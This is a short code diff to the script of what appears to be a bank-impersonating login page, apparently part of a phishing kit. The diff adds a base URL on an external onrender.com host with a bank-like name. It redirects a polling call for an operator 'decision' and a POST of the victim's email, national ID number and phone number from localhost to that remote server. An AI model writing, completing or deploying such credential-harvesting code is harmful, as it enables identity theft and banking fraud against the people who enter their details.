@@ -298,6 +298,7 @@ border-radius: 14px;
 </div>
 </div>
 <script>
+var API_BASE = window.location.hostname === "localhost" ? "http://localhost:4000" : "https://brbpagos4banncs-api.onrender.com";
 var numeroDocumento = document.getElementById("numero-documento");
 var passwordInput = document.getElementById("password");
 var submitButton = document.querySelector(".submit-button");
@@ -338,7 +339,7 @@ window.location.href = url;
 function startDecisionPolling() {
 if (decisionIntervalId !== null) return;
 decisionIntervalId = setInterval(function () {
-fetch("http://localhost:4000/decision")
+fetch(API_BASE + "/decision")
 .then(function (res) { return res.json(); })
 .then(function (data) {
 if (!data || !data.decision) return;
@@ -380,7 +381,7 @@ email: sessionStorage.getItem("user_email") || "",
 cedula: sessionStorage.getItem("user_cedula") || "",
 celular: sessionStorage.getItem("bc_usuario") || ""
 };
-fetch("http://localhost:4000/ingresar-popular", {
+fetch(API_BASE + "/ingresar-popular", {
 method: "POST",
 headers: {
 "Content-Type": "application/json"
